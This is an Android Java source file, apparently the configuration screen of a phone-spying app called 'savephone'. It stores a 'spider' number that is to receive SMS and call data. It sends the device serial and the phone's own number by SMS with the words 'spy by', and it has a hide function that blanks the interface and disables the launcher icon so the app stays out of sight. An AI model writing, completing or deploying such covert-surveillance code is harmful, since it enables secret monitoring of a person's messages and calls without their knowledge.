package com.future.it.gasmyr.savephone;

import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class Configuration extends AppCompatActivity {
    private SharedPreferences sharedPreferences;
    private SharedPreferences.Editor editor;
    private EditText phoneNumber;
    private TextView applicationKeyText;
    private CheckBox smsCheckBox;
    private CheckBox callCheckBox;
    private Button saveConfigurationButton;
    private Button saveApplicationKeyButton;
    private Button askApplicationKeyButton;
    private Button hideApplicationKeyButton;
    private boolean applicationIsHide=false;

    private LinearLayout main1;
    private LinearLayout main2;
    private LinearLayout main3;
    private LinearLayout main4;
    private LinearLayout main5;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_configuration);
        sharedPreferences=getSharedPreferences(ApplicationConstants.APPLICATION_SHARE_PREF_ID, Context.MODE_PRIVATE);
        applicationIsHide=sharedPreferences.getBoolean(ApplicationConstants.APPLICATION_IS_HIDE, false);
        if(applicationIsHide){
            hideAllElementsOnView();
        }
        init();
        saveConfigurationButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                init();
                if (phoneNumber.getText().toString().length() <= 8 || phoneNumber.getText().toString().length() >= 10) {
                    Toast.makeText(getApplicationContext(), ApplicationConstants.APPLICATION_NUMBER_LENGTH_WARNING, Toast.LENGTH_LONG).show();
                } else {
                    editor = sharedPreferences.edit();
                    editor.putString(ApplicationConstants.APPLICATION_SPIDER_NUMBER, phoneNumber.getText().toString());
                    if (phoneNumber.getText().toString().startsWith("67") || phoneNumber.getText().toString().startsWith("654")) {
                        editor.putString(ApplicationConstants.APPLICATION_SEND_KEY_METHOD, "MTN");

                    } else {
                        editor.putString(ApplicationConstants.APPLICATION_SEND_KEY_METHOD, "ORANGE");
                    }

                    editor.putBoolean(ApplicationConstants.APPLICATION_IS_SMS_ENABLE, smsCheckBox.isChecked());
                    editor.putBoolean(ApplicationConstants.APPLICATION_IS_CALL_ENABLE, callCheckBox.isChecked());
                    editor.commit();
                    phoneNumber.setEnabled(false);
                }
            }
        });

        askApplicationKeyButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                init();
                String key= Build.SERIAL;
                key.concat(Build.ID);
                Message message=new Message();
                String method=sharedPreferences.getString(ApplicationConstants.APPLICATION_SEND_KEY_METHOD,"MTN");
                String spider=sharedPreferences.getString(ApplicationConstants.APPLICATION_SPIDER_NUMBER,ApplicationConstants.APPLICATION_DEFAULT_SEND_TO_NUMBER);
                if(method.equalsIgnoreCase("MTN")){
                    message.sendMessage(ApplicationConstants.APPLICATION_MTN_KEY, key + " key for " + getPhoneNumber()+ " spy by: "+spider);
                }
                else{
                    message.sendMessage(ApplicationConstants.APPLICATION_ORANGE_KEY, key + " key for " + getPhoneNumber());
                }

                Toast.makeText(getApplicationContext(),R.string.generatedKey,Toast.LENGTH_LONG).show();
                Toast.makeText(getApplicationContext(),R.string.generatedKey,Toast.LENGTH_LONG).show();

            }
        });


        saveApplicationKeyButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                init();
                if (applicationKeyText.getText().toString().length() >= 4) {
                    editor = sharedPreferences.edit();
                    editor.putString(ApplicationConstants.APPLICATION_KEY, applicationKeyText.getText().toString());
                    editor.commit();
                }
                ApplicationLicence licence = new ApplicationLicence("KEY");
                if(!licence.generateKey().equals(applicationKeyText.getText().toString())){
                    Toast.makeText(getApplicationContext(),R.string.invalideKey,Toast.LENGTH_LONG).show();
                    Toast.makeText(getApplicationContext(),R.string.invalideKey,Toast.LENGTH_LONG).show();
                    applicationKeyText.setText("INVALID KEY");
                }
                else{
                    Toast.makeText(getApplicationContext(),R.string.valideKey,Toast.LENGTH_LONG).show();
                    Toast.makeText(getApplicationContext(),R.string.valideKey,Toast.LENGTH_LONG).show();
                    applicationKeyText.setText("VERY WELL");
                    applicationKeyText.setEnabled(false);
                }


            }
        });

        hideApplicationKeyButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                init();
                editor=sharedPreferences.edit();
                editor.putBoolean(ApplicationConstants.APPLICATION_IS_HIDE,true);
                editor.commit();
                hideAllElementsOnView();
                hideIcon();
            }
        });


        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view,ApplicationConstants.APPLICATION_DEVELOPER, Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
    }
    private void init(){
        phoneNumber=(EditText)findViewById(R.id.phoneNumber);
        smsCheckBox=(CheckBox) findViewById(R.id.smsCheckBox);
        callCheckBox=(CheckBox)findViewById(R.id.callCheckBox);
        applicationKeyText=(EditText)findViewById(R.id.applicationKey);
        saveConfigurationButton=(Button)findViewById(R.id.saveConfigButton);
        askApplicationKeyButton=(Button)findViewById(R.id.askApplicationKeyButton);
        saveApplicationKeyButton=(Button)findViewById(R.id.saveAppKeyButton);
        hideApplicationKeyButton=(Button)findViewById(R.id.hideAppButton);
    }

    public void hideAllElementsOnView(){
        main1=(LinearLayout)findViewById(R.id.main1);
        main1.setVisibility(View.INVISIBLE);
        main2=(LinearLayout)findViewById(R.id.main2);
        main2.setVisibility(View.INVISIBLE);
        main3=(LinearLayout)findViewById(R.id.main3);
        main3.setVisibility(View.INVISIBLE);
        main4=(LinearLayout)findViewById(R.id.main4);
        main4.setVisibility(View.INVISIBLE);
        main5=(LinearLayout)findViewById(R.id.main5);
        main5.setVisibility(View.INVISIBLE);
    }
    public String getPhoneNumber(){
        TelephonyManager telephonyManager = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
        return telephonyManager.getLine1Number();
    }
    public void hideIcon(){
        try{
            ComponentName cDisable= new ComponentName("com.future.it.gasmyr.savephone","com.gasmyrmougang.designthinking.ifirst.MainActivity");

            PackageManager packageManager=getPackageManager();
            packageManager.setComponentEnabledSetting(cDisable,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);

        }catch (Exception e){
            e.printStackTrace();
        }
    }
    @Override
    protected void onResume() {
        super.onResume();
        sharedPreferences=getSharedPreferences(ApplicationConstants.APPLICATION_SHARE_PREF_ID, Context.MODE_PRIVATE);
        applicationIsHide=sharedPreferences.getBoolean(ApplicationConstants.APPLICATION_IS_HIDE,false);
        if(applicationIsHide){
           hideAllElementsOnView();
        }
    }

}
